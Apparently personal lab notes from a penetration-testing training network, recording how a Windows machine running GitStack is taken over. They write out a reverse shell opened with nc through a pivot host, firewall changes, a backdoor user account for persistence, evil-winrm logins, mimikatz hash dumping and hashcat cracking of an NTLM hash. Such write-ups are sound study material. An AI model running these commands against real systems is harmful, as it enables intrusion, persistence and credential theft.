- Found [RCE](https://www.exploit-db.com/exploits/43777) on `GitStack` (see [[10.200.81.150]])

# Grab a windows shell
---
- Since, our machine is not directly accessible, we can use the `prod` linux box to transfer a `nc`.
- But first, we need to **add the port** so we can transfer the file on the prod server
	- `firewall-cmd --zone=public --add-port PORT/tcp`
	- Transfer `nc.exe` on windows and `nc` on prod server.
	- On prod server:
		- `firewall-cmd --zone=public --add-port 9999/tcp`
		- `./nc -lnvp 9999`
		- `curl 10.200.81.200:8000/nc.exe -o nc.exe`
	- On windows machine (**through RCE exploit**):
		- `Enter Command: nc.exe -e cmd.exe 10.200.81.200 9999`
- ![[Pasted image 20250403162837.png]]

- `twreath`'s hash found:
- ![[Pasted image 20250403163408.png]]
- `netsh advfirewall firewall add rule name="Chisel-drasstrange" dir=in action=allow protocol=tcp localport=47001`

 - **We can add user for persistant access**
---
- `net user /add hawkeye Password1`
- `evil-winrm` to connect:
	- `evil-winrm -i 10.200.81.150 -u hawkeye -p Password1`

# Mimikatz
---
- Get them `hashes` using mimkatz:
	- We can use the `Administrator` hash to login using `evil-winrm`:
		- ![[Pasted image 20250404171534.png]]
	- Thomas's Hash:
		- ![[Pasted image 20250404171602.png]]
	- Let's crack Thomas's hash:
		- `hashcat thomas_windows_hash  /usr/share/wordlists/rockyou.txt -m 1000`
			- ![[Pasted image 20250404171656.png]]

